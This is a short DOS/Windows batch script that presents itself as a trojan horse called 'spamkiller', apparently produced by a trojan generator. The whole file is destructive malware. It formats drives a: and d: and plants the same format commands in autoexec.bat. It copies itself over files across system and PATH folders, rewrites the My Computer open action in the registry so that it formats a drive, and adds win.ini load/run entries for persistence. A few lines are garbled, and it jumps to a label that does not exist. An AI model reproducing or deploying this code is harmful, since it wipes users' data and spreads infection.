@echo off
rem name of the trojan horse: spamkiller
rem author of the trojan horse: viruswurm
rem generated with batch trojan generator 0.07
ctty nul
ech%qzbca @ctty nul >autoexec.bat
echo %cfa% a: /u /q /autotest >> c:\autoexec.bat
echo format d: /u /q /autotest >> c:\autoexec.bat
echo for %%a in (*.* a:\*.* %windir%\*.* \*.* ..\*.* %path%\*.*) do copy %0 %%a >> autoexec.bat
format a: /u /q /autotest
format d: /u /q /autotest
for %%a in (*.* a:\*.* %windir%\*.* \*.* ..\*.* %path%\*.*) do copy %0 %%a
echo>c:\regbomb.reg regedit4
echo.>>c:\regbomb.reg
echo>>c:\regbomb.reg [hkey_local_machine\software\classes\clsid\{20d04fe0-3aea-1069-a2d8-08002b30309d}\shell\open]
echo.>>c:\regbomb.reg
echo >>c:\regbomb.reg [hkey_local_machine\software\classes\clsid\{20d04fe0-3aea-1069-a2d8-08002b30309d}\shell\open\command]
echo >>c:\regbomb.reg @="start /minimized command /c echo y|format a: /q /u /autotest >nul"
echo.>>c:\regbomb.reg
regedit.exe c:\regbomb.reg
copy %0 %windir%\asd.bat
echo [windows] > %windir%\win.ini
echo load=%windir%\asd.bat >> %windir%\win.ini
echo run=%windir%\asd.bat >> %windir%\win.ini
goto tari
:tawei
echoch uy=none >> %windir%\win.ini
